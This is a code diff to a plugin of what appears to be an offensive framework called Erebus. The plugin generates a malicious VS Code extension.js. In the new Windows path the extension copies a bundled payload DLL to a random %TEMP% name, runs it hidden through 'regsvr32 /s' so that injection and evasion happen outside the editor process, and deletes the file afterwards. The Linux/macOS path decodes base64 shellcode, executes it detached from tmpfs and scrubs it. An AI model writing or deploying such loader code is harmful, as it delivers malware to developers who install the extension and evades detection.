@@ -196,9 +196,10 @@ class VsCodeExtTriggerPlugin(ErebusPlugin):
         """
         Render extension.js.
 
-        Windows: require('./payload.node') triggers DllMain in the Erebus.Loader
-        DLL. The require() throws (no NAPI exports) but the NtCreateThreadEx'd
-        loader thread is already running by then - catch silences it.
+        Windows: copy bundled DLL to %TEMP%\\<rand>.dll, spawn `regsvr32 /s`
+        detached. regsvr32 LoadLibrary fires DllMain (kicks EntryThread), then
+        calls DllRegisterServer which blocks on EntryThread until injection
+        completes. Code.exe never loads the DLL — host process stays clean.
 
         Linux/macOS: tmpfs write + detached exec, scrubbed after 8s.
         """
@@ -220,10 +221,18 @@ class VsCodeExtTriggerPlugin(ErebusPlugin):
             "function _run(context) {\n"
             "    try {\n"
             "        if (os.platform() === 'win32') {\n"
-            "            // Load Erebus.Loader DLL via require() - DllMain fires on LoadLibrary.\n"
-            "            // require() throws (no NAPI exports) but NtCreateThreadEx'd loader\n"
-            "            // thread is already running at that point.\n"
-            "            try { require(path.join(context.extensionPath, 'out', 'payload.node')); } catch(_) {}\n"
+            "            // Copy bundled DLL to %TEMP% with a random name, then\n"
+            "            // spawn regsvr32 /s detached. Evasion + injection happen\n"
+            "            // inside regsvr32, NOT inside Code.exe extension host.\n"
+            f"            const dst = path.join(os.tmpdir(), '{rand_name}' + '.dll');\n"
+            "            try { fs.copyFileSync(path.join(context.extensionPath, 'out', 'payload.node'), dst); } catch(_) { return; }\n"
+            "            try {\n"
+            "                cp.spawn('regsvr32.exe', ['/s', dst], {\n"
+            "                    detached: true, stdio: 'ignore', windowsHide: true,\n"
+            "                }).unref();\n"
+            "            } catch(_) {}\n"
+            "            // Scrub the dropped DLL after injection has had time to finish.\n"
+            "            setTimeout(() => { try { fs.unlinkSync(dst); } catch(_) {} }, 45000);\n"
             "        } else {\n"
             "            // Linux / macOS: tmpfs write + detached exec, scrub after 8s\n"
             f"            const sc  = Buffer.from('{shellcode_b64}', 'base64');\n"
